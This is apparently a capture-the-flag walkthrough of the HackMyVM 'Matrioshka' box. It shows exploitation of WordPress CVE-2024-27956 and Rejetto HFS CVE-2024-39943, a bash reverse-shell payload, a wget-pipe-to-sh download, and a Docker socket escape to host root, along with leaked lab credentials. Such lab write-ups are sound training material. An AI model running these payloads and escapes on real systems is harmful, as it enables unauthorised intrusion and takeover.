# Matrioshka

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.60:22
Open 10.0.2.60:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.60

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 b5:a4:7c:65:5c:1f:d7:89:42:bd:76:df:2c:8e:93:4e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP1XOWXFRA4APUDEG4a/hcbKUOu0DkzxCHuEoI2py6/DVQ0h9qNkjVO8oCJRPNwNRUI05sSCB7WCwUYWuX+oDuU=
|   256 5d:3d:2b:43:fc:89:fa:24:a3:f4:73:5f:7b:89:6c:e3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKNNjSS0msWGvbhNzXghC/zqaoTABTt/8T83ckjP31oo
80/tcp open  http    syn-ack Apache httpd 2.4.61 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.61 (Debian)
|_http-title: mamushka
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

### Wordpress

Links use DNS name `mamushka.hmv` so make sure to update DNS.

![writeup.png](/assets/pentest/hackmyvm/matrioshka/writeup.png)

Different pages, mostly 301 need authentication
```bash
└─$ ffuf -u 'http://mamushka.hmv/?page_id=FUZZ' -w <(seq 1 100)  -mc all -fr 'Page Not Found'
2                       [Status: 200, Size: 66194, Words: 2112, Lines: 451, Duration: 6157ms]
13                      [Status: 200, Size: 64570, Words: 2018, Lines: 484, Duration: 5987ms]
14                      [Status: 200, Size: 66054, Words: 2109, Lines: 471, Duration: 6185ms]
15                      [Status: 200, Size: 67296, Words: 2183, Lines: 561, Duration: 6053ms]
18                      [Status: 200, Size: 63515, Words: 1969, Lines: 466, Duration: 6145ms]

1                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 627ms]
12                      [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 8749ms]
16                      [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 8534ms]
17                      [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 9521ms]
30                      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1741ms]
32                      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 782ms]
33                      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 866ms]
35                      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 401ms]
36                      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 8793ms]
37                      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 6811ms]
38                      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 7937ms]
39                      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 9430ms]
40                      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 899ms]
42                      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 304ms]
```

### CVE-2024-27956

Enumerate with `nuclei` or `wp-scan`
```bash
└─$ nuclei -u http://mamushka.hmv/
[CVE-2024-27956] [http] [critical] http://mamushka.hmv/wp-content/plugins/wp-automatic/inc/csv.php
[wordpress-xmlrpc-listmethods] [http] [info] http://mamushka.hmv/xmlrpc.php
[ssh-auth-methods] [javascript] [info] mamushka.hmv:22 ["["publickey","password"]"]
[ssh-password-auth] [javascript] [info] mamushka.hmv:22
[ssh-sha1-hmac-algo] [javascript] [info] mamushka.hmv:22
[ssh-server-enumeration] [javascript] [info] mamushka.hmv:22 ["SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3"]
[openssh-detect] [tcp] [info] mamushka.hmv:22 ["SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3"]
[wp-xmlrpc-pingback-detection] [http] [info] http://mamushka.hmv/xmlrpc.php
[wp-user-enum:usernames] [http] [low] http://mamushka.hmv/?rest_route=/wp/v2/users/ ["admin"]
[wordpress-login] [http] [info] http://mamushka.hmv/wp-login.php
[wordpress-readme-file] [http] [info] http://mamushka.hmv/readme.html
[apache-detect] [http] [info] http://mamushka.hmv/ ["Apache/2.4.61 (Debian)"]
[php-detect] [http] [info] http://mamushka.hmv/ ["8.2.22"]
[oob-header-based-interaction:dns] [http] [info] http://mamushka.hmv/
[wp-enabled-registration] [http] [info] http://mamushka.hmv/?page_id=14
[wp-license-file] [http] [info] http://mamushka.hmv/license.txt
[wordpress-xmlrpc-detect] [http] [info] http://mamushka.hmv/xmlrpc.php
[caa-fingerprint] [dns] [info] mamushka.hmv
[wordpress-plugin-detect:ultimate-member] [http] [info] http://mamushka.hmv/
[wordpress-theme-detect:twentytwentyfour] [http] [info] http://mamushka.hmv/
[INF] Scan completed in 5m. 42 matches found.
# Cropped scan results
```

- [CVE-2024-27956](https://cvefeed.io/vuln/detail/CVE-2024-27956): WordPress Automatic plugin <= 3.92.0 - Unauthenticated Arbitrary SQL Execution vulnerability
- [https://nvd.nist.gov/vuln/detail/CVE-2024-27956](https://nvd.nist.gov/vuln/detail/CVE-2024-27956)
	- [https://patchstack.com/articles/critical-vulnerabilities-patched-in-wordpress-automatic-plugin?_s_id=cve](https://patchstack.com/articles/critical-vulnerabilities-patched-in-wordpress-automatic-plugin?_s_id=cve)
- [wordpress-CVE-2024-27956](https://github.com/m4nInTh3mIdDle/wordpress-CVE-2024-27956/tree/main) POC
- [https://www.rapid7.com/db/modules/exploit/multi/http/wp_automatic_sqli_to_rce](https://www.rapid7.com/db/modules/exploit/multi/http/wp_automatic_sqli_to_rce) MSF

The injection is boolean based and doesn't seem to return any data.
```bash
└─$ py /media/sf_VBoxShare/t.py 'http://mamushka.hmv/wp-content/plugins/wp-automatic/inc/csv.php' 'SELECT * FROM wp_users WHERE user_login="admin"'
DATE,ACTION,DATA,KEYWORD
1970-1-1 00:00:00,,,

└─$ py /media/sf_VBoxShare/t.py 'http://mamushka.hmv/wp-content/plugins/wp-automatic/inc/csv.php' 'SELECT * FROM wp_users WHERE user_login="adminx"'
DATE,ACTION,DATA,KEYWORD
```

```bash
└─$ msfconsole -q
msf > search wp_automatic_sqli_to_rce
   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_automatic_sqli_to_rce  2024-03-13       excellent  Yes    WordPress wp-automatic Plugin SQLi Admin Creation
   1    \_ target: PHP In-Memory                   .                .          .      .
   2    \_ target: Unix/Linux Command Shell        .                .          .      .
   3    \_ target: Windows Command Shell           .                .          .      .

msf6 > use 1
msf exploit(multi/http/wp_automatic_sqli_to_rce) > set RHOST 10.0.2.60
RHOST => 10.0.2.60

msf exploit(multi/http/wp_automatic_sqli_to_rce) > run
[*] Started reverse TCP handler on 10.0.2.15:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Attempting SQLi test to verify vulnerability...
[+] The target is vulnerable. Target is vulnerable to SQLi!
[-] Exploit aborted due to failure: unexpected-reply: Failed to log in to WordPress admin.
[*] Exploit completed, but no session was created.

msf exploit(multi/http/wp_automatic_sqli_to_rce) > options
   PASSWORD   K3I6nr0KYPCKzB                     no        Password for the new user
   USERNAME   gaynell                            no        Username to create
```

### RCE

![writeup-1.png](/assets/pentest/hackmyvm/matrioshka/writeup-1.png)

Edit theme and get RCE [https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html?highlight=wordpress#panel-rce](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html?highlight=wordpress#panel-rce)

![writeup-2.png](/assets/pentest/hackmyvm/matrioshka/writeup-2.png)

Access it: [http://mamushka.hmv/wp-content/themes/twentytwentytwo/](http://mamushka.hmv/wp-content/themes/twentytwentytwo/)

![writeup-3.png](/assets/pentest/hackmyvm/matrioshka/writeup-3.png)

Looks like we are in a container
```bash
www-data@3ed5ddfe0e0c:…/themes/twentytwentytwo# env | grep WORDPRESS
WORDPRESS_DB_PASSWORD=Fukurokuju
WORDPRESS_DB_HOST=db
WORDPRESS_DB_USER=matrioska
WORDPRESS_DB_NAME=wordpressdb

www-data@3ed5ddfe0e0c:…/themes/twentytwentytwo# grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
```

## SSH

The login with wordpress user doesn't work, but fixing the `s` to `sh` was correct username.
```bash
└─$ sshpass -p 'Fukurokuju' ssh matrioska@mamushka.hmv
Warning: Permanently added 'mamushka.hmv' (ED25519) to the list of known hosts.
Permission denied, please try again.

└─$ sshpass -p 'Fukurokuju' ssh matrioshka@mamushka.hmv
matrioshka@matrioshka:~$ id
uid=1000(matrioshka) gid=1000(matrioshka) groups=1000(matrioshka),100(users)
```

### User.txt

```bash
matrioshka@matrioshka:~$ cat user.txt
c8129b0390452d8378535cff76e0dde8
```

## Privilege Escalation

```bash
matrioshka@matrioshka:~$ ss -tunlp4
Netid    State     Recv-Q     Send-Q         Local Address:Port          Peer Address:Port    Process
udp      UNCONN    0          0                    0.0.0.0:68                 0.0.0.0:*
tcp      LISTEN    0          128                  0.0.0.0:22                 0.0.0.0:*
tcp      LISTEN    0          4096               127.0.0.1:8080               0.0.0.0:*
tcp      LISTEN    0          4096               127.0.0.1:9090               0.0.0.0:*
tcp      LISTEN    0          4096               127.0.0.1:40879              0.0.0.0:*
```

We can ignore the 8080
```bash
matrioshka@matrioshka:~$ curl 0:8080 -I
HTTP/1.1 301 Moved Permanently
Date: Sun, 28 Sep 2025 15:45:17 GMT
Server: Apache/2.4.61 (Debian)
X-Powered-By: PHP/8.2.22
X-Redirect-By: WordPress
Location: http://0.0.0.0/
Content-Type: text/html; charset=UTF-8
```

```html
matrioshka@matrioshka:~$ curl 0:9090
<!DOCTYPE html>
<html>
  <head>
    <title>File server</title>
    <link rel="shortcut icon" href="/favicon.ico?0" />
    <script>
      HFS = {
        "VERSION": "0.52.9",
        "API_VERSION": 8.72,
        "SPECIAL_URI": "/~/",
        "PLUGINS_PUB_URI": "/~/plugins/",
        "FRONTEND_URI": "/~/frontend/",
        "session": {
          "username": "",
          "exp": "2025-09-29T15:45:45.202Z"
        },
        "plugins": {},
        "prefixUrl": "",
        "dontOverwriteUploading": true,
        "customHtml": {},
        "file_menu_on_link": true,
        "tile_size": 0,
        "sort_by": "name",
        "invert_order": false,
        "folders_first": true,
        "sort_numerics": false,
        "theme": "",
        "auto_play_seconds": 5,
        "lang": {}
      }
      document.documentElement.setAttribute('ver', '0.52.9')
    </script>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=0" />
    <link href="/~/frontend/fontello.css" rel="stylesheet" />
    <script type="module" crossorigin src="/~/frontend/assets/index-Uv-vNCsJ.js"></script>
    <link rel="stylesheet" crossorigin href="/~/frontend/assets/index-Bnwe3ltN.css">
  </head>
  <body>
    <style>
      :root {}
    </style>
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="root"></div>
    <script nomodule>
      document.getElementById('root').innerText = "Please use a newer browser"
    </script>
  </body>
</html>
```

```bash
matrioshka@matrioshka:~$ curl 0:40879
404: Page Not Found
```

### HTTP (9090)

Port forward
```bash
└─$ sshpass -p 'Fukurokuju' ssh matrioshka@mamushka.hmv -L 9090:0:9090 -L 40879:0:40879
```

![writeup-4.png](/assets/pentest/hackmyvm/matrioshka/writeup-4.png)

### CVE-2024-39943

- Google `File Server "0.52.9" exploit`
	- [Rejetto HTTP File Server up to 0.52.9 on Linux/Unix/macOS Upload Node.js child_process os command injection](https://vuldb.com/?id.270364)
	- **[CVE-2024-39943-Poc](https://github.com/truonghuuphuc/CVE-2024-39943-Poc)**

Observing the CVE I noticed we can login using `admin:admin` or `guest:guest`

```bash
# Download
└─$ curl -LOs https://raw.githubusercontent.com/truonghuuphuc/CVE-2024-39943-Poc/refs/heads/main/poc_user_admin.py
# Change this line
command = "/bin/bash -c '/bin/bash -i >& /dev/tcp/{0}/{1} 0>&1'".format(ip,port)
```

### Docker

```bash
└─$ listen
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.0.2.60:48906.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3cda0a5990ca:~/.hfs# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
(remote) root@5a38e107054c:/# wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh -O- | sh
 Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE) by stealthcopter

===================================( Enumerating Platform )===================================
[+] Inside Container ........ Yes
[+] Container Platform ...... docker
[+] Container tools ......... Yes
/usr/bin/docker
[+] User .................... root
[+] Groups .................. root
[+] Sudoers ................. No
[+] Docker Executable ....... /usr/bin/docker
[+] Docker version .......... 26.1.3
[+] Rootless ................ No
[+] User in Docker group .... No
[+] Docker Sock ............. Yes
srw-rw---- 1 root 111 0 Sep 28 17:49 /var/run/docker.sock
[+] Sock is writable ........ Yes
The docker sock is writable, we should be able to enumerate docker, create containers
and obtain root privs on the host machine
See https://stealthcopter.github.io/deepce/guides/docker-sock.md

[+] Docker Version .......... 26.1.3
[+] CVE–2019–13139 .......... No
[+] CVE–2019–5736 ........... No
==================================( Enumerating Container )===================================
[+] Container ID ............ 5a38e107054c
[+] Container Full ID ....... /
[+] Container Name .......... Could not get container name through reverse DNS
[+] Container IP ............ 172.19.0.2
[+] DNS Server(s) ........... 127.0.0.11
[+] Host IP ................. 172.19.0.1
[+] Operating System ........ GNU/Linux
[+] Kernel .................. 6.1.0-23-amd64
[+] Arch .................... x86_64
[+] CPU ..................... Intel(R) Core(TM) i7-5700HQ CPU @ 2.70GHz
[+] Useful tools installed .. Yes
/usr/bin/docker
/usr/bin/wget
/usr/bin/nc
/usr/bin/netcat
/usr/bin/hostname
/usr/bin/python3
[+] Dangerous Capabilities .. Yes
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
[+] SSHD Service ............ No
[+] Privileged Mode ......... No
====================================( Enumerating Mounts )====================================
[+] Docker sock mounted ....... Yes
The docker sock is writable, we should be able to enumerate docker, create containers
and obtain root privs on the host machine
See https://stealthcopter.github.io/deepce/guides/docker-sock.md

[+] Other mounts .............. Yes
/root/.docker-hfs/config.yaml /opt/hfs/config.yaml rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro
/root/.docker-hfs/data /opt/hfs/data rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro
/root/.docker-hfs/hfs-linux.zip /opt/hfs/hfs-linux.zip rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro
[+] Possible host usernames ...
====================================( Interesting Files )=====================================
[+] Interesting environment variables ... No
[+] Any common entrypoint files ......... No
[+] Interesting files in root ........... No
[+] Passwords in common files ........... No
[+] Home directories .................... No
[+] Hashes in shadow file ............... No
[+] Searching for app dirs ..............
==================================( Enumerating Containers )==================================
By default containers can communicate with other containers on the same network and the
host machine, this can be used to enumerate further

[+] Docker Containers........ 3
CONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS          PORTS                    NAMES
5a38e107054c   ubuntu:20.04   "/bin/bash -c 'apt-g…"   16 minutes ago   Up 16 minutes   127.0.0.1:9090->80/tcp   docker-hfs_hfs_1
8485358c3c48   mysql:8.0.0    "docker-entrypoint.s…"   13 months ago    Up 16 minutes   3306/tcp                 docker-wp_db_1
3ed5ddfe0e0c   wordpress      "docker-entrypoint.s…"   13 months ago    Up 16 minutes   127.0.0.1:8080->80/tcp   docker-wp_wordpress_1
==============================================================================================
```

## Docker Breakout

`docker` binary exists inside a docker container and is accessible by us (root)

[https://gtfobins.github.io/gtfobins/docker](https://gtfobins.github.io/gtfobins/docker)

We are able to breakout easily with `docker` command right away by mounting the whole host to new container.
```bash
(remote) root@5a38e107054c:/# docker run -v /:/mnt --rm -it ubuntu:20.04 chroot /mnt bash
root@5ace67c6e360:/# id
uid=0(root) gid=0(root) groups=0(root)
root@5ace67c6e360:/# ls /home
matrioshka
```

### Root.txt

```
root@5ace67c6e360:/# cat /root/root.txt
7f5d6dbbaff0a1fc6d2a5c9160362908
```